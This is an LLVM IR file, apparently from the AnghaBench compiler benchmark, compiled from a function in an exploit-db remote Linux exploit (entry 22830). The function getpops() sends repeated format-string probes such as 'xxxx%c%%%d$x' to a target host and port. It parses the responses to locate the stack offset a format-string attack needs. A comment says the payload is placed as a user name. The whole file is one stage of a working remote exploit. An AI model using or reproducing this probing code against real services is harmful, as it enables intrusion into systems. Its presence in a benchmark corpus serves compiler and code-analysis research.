; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22830.c_getpops.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22830.c_getpops.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@FMTSIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [36 x i8] c"getpops(): allocating memory failed\00", align 1
@.str.1 = private unnamed_addr constant [280 x i8] c"NOTE: i did not add the command to disconnect the user.\0Aso, you have to wait roughly a minute before each user\0A(format string placed as a user) times out.  basically,\0Await a minute in-between using it.  also, the packets may\0Aor may not come back in order. (or come back at all)\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [32 x i8] c"[*] finding pop value: %s:%d.\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [11 x i8] c"\00\00\00\00\00\00\00\00\03\04\00", align 1
@.str.4 = private unnamed_addr constant [25 x i8] c"xxxx%c%c%%%d$x%cunused%c\00", align 1
@.str.5 = private unnamed_addr constant [23 x i8] c"xxxx%c%%%d$x%cunused%c\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"%.4s\00", align 1
@.str.7 = private unnamed_addr constant [5 x i8] c"%.8s\00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"xxxx\00", align 1
@.str.9 = private unnamed_addr constant [9 x i8] c"78787878\00", align 1
@.str.10 = private unnamed_addr constant [15 x i8] c"%d:\09(true)\09%s\0A\00", align 1
@.str.11 = private unnamed_addr constant [28 x i8] c"\0A[*] the pop value is: %d.\0A\00", align 1
@.str.12 = private unnamed_addr constant [16 x i8] c"%d:\09(false)\09%s\0A\00", align 1
@.str.13 = private unnamed_addr constant [10 x i8] c"(no data)\00", align 1
@.str.14 = private unnamed_addr constant [32 x i8] c"\0A[!] pop location find failed.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @getpops(i8* %0, i16 zeroext %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i16, align 2
  %5 = alloca i32, align 4
  %6 = alloca [5 x i8], align 1
  %7 = alloca [9 x i8], align 1
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i16 %1, i16* %4, align 2
  store i32 0, i32* %5, align 4
  %10 = load i32, i32* @FMTSIZE, align 4
  %11 = add nsw i32 %10, 1
  %12 = call i64 @malloc(i32 %11)
  %13 = inttoptr i64 %12 to i8*
  store i8* %13, i8** %8, align 8
  %14 = icmp ne i8* %13, null
  br i1 %14, label %17, label %15

15:                                               ; preds = %2
  %16 = call i32 @printe(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str, i64 0, i64 0), i32 1)
  br label %17

17:                                               ; preds = %15, %2
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([280 x i8], [280 x i8]* @.str.1, i64 0, i64 0))
  %19 = load i8*, i8** %3, align 8
  %20 = load i16, i16* %4, align 2
  %21 = zext i16 %20 to i32
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.2, i64 0, i64 0), i8* %19, i32 %21)
  br label %23

23:                                               ; preds = %107, %17
  %24 = load i32, i32* %5, align 4
  %25 = add i32 %24, 1
  store i32 %25, i32* %5, align 4
  %26 = icmp ult i32 %24, 255
  br i1 %26, label %27, label %109

27:                                               ; preds = %23
  %28 = load i8*, i8** %8, align 8
  %29 = load i32, i32* @FMTSIZE, align 4
  %30 = add nsw i32 %29, 1
  %31 = call i32 @memset(i8* %28, i32 0, i32 %30)
  %32 = load i8*, i8** %8, align 8
  %33 = call i32 @memcpy(i8* %32, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i64 0, i64 0), i32 10)
  %34 = load i32, i32* %5, align 4
  %35 = icmp eq i32 %34, 37
  br i1 %35, label %36, label %43

36:                                               ; preds = %27
  %37 = load i8*, i8** %8, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 10
  %39 = load i32, i32* %5, align 4
  %40 = load i32, i32* %5, align 4
  %41 = load i32, i32* %5, align 4
  %42 = call i32 (i8*, i8*, ...) @sprintf(i8* %38, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.4, i64 0, i64 0), i32 %39, i32 %40, i32 %41, i32 0, i32 0)
  br label %49

43:                                               ; preds = %27
  %44 = load i8*, i8** %8, align 8
  %45 = getelementptr inbounds i8, i8* %44, i64 10
  %46 = load i32, i32* %5, align 4
  %47 = load i32, i32* %5, align 4
  %48 = call i32 (i8*, i8*, ...) @sprintf(i8* %45, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.5, i64 0, i64 0), i32 %46, i32 %47, i32 0, i32 0)
  br label %49

49:                                               ; preds = %43, %36
  %50 = load i8*, i8** %3, align 8
  %51 = load i16, i16* %4, align 2
  %52 = load i8*, i8** %8, align 8
  %53 = load i32, i32* @FMTSIZE, align 4
  %54 = call i64 @send_packet(i8* %50, i16 zeroext %51, i8* %52, i32 %53, i32 1)
  %55 = inttoptr i64 %54 to i8*
  store i8* %55, i8** %9, align 8
  %56 = getelementptr inbounds [5 x i8], [5 x i8]* %6, i64 0, i64 0
  %57 = call i32 @memset(i8* %56, i32 0, i32 5)
  %58 = getelementptr inbounds [5 x i8], [5 x i8]* %6, i64 0, i64 0
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i64 13
  %61 = call i32 (i8*, i8*, ...) @sprintf(i8* %58, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0), i8* %60)
  %62 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i64 0, i64 0
  %63 = call i32 @memset(i8* %62, i32 0, i32 9)
  %64 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i64 0, i64 0
  %65 = load i8*, i8** %9, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 18
  %67 = call i32 (i8*, i8*, ...) @sprintf(i8* %64, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i64 0, i64 0), i8* %66)
  %68 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i64 0, i64 0
  %69 = call i64 @strlen(i8* %68)
  %70 = icmp ne i64 %69, 0
  br i1 %70, label %71, label %107

71:                                               ; preds = %49
  %72 = getelementptr inbounds [5 x i8], [5 x i8]* %6, i64 0, i64 0
  %73 = call i64 @strlen(i8* %72)
  %74 = icmp ne i64 %73, 0
  br i1 %74, label %75, label %107

75:                                               ; preds = %71
  %76 = getelementptr inbounds [5 x i8], [5 x i8]* %6, i64 0, i64 0
  %77 = call i32 @strcmp(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i8* %76)
  %78 = icmp ne i32 %77, 0
  br i1 %78, label %107, label %79

79:                                               ; preds = %75
  %80 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i64 0, i64 0
  %81 = call i32 @strcmp(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.9, i64 0, i64 0), i8* %80)
  %82 = icmp ne i32 %81, 0
  br i1 %82, label %92, label %83

83:                                               ; preds = %79
  %84 = load i8*, i8** %9, align 8
  %85 = getelementptr inbounds i8, i8* %84, i64 17
  %86 = load i8, i8* %85, align 1
  %87 = zext i8 %86 to i32
  %88 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i64 0, i64 0
  %89 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.10, i64 0, i64 0), i32 %87, i8* %88)
  %90 = load i32, i32* %5, align 4
  %91 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.11, i64 0, i64 0), i32 %90)
  br label %111

92:                                               ; preds = %79
  %93 = load i8*, i8** %9, align 8
  %94 = getelementptr inbounds i8, i8* %93, i64 17
  %95 = load i8, i8* %94, align 1
  %96 = zext i8 %95 to i32
  %97 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i64 0, i64 0
  %98 = call i64 @strlen(i8* %97)
  %99 = icmp ne i64 %98, 0
  br i1 %99, label %100, label %102

100:                                              ; preds = %92
  %101 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i64 0, i64 0
  br label %103

102:                                              ; preds = %92
  br label %103

103:                                              ; preds = %102, %100
  %104 = phi i8* [ %101, %100 ], [ getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i64 0, i64 0), %102 ]
  %105 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.12, i64 0, i64 0), i32 %96, i8* %104)
  br label %106

106:                                              ; preds = %103
  br label %107

107:                                              ; preds = %106, %75, %71, %49
  %108 = call i32 @usleep(i32 100000)
  br label %23

109:                                              ; preds = %23
  %110 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.14, i64 0, i64 0))
  br label %111

111:                                              ; preds = %109, %83
  ret void
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i64 @send_packet(i8*, i16 zeroext, i8*, i32, i32) #1

declare dso_local i64 @strlen(i8*) #1

declare dso_local i32 @strcmp(i8*, i8*) #1

declare dso_local i32 @usleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
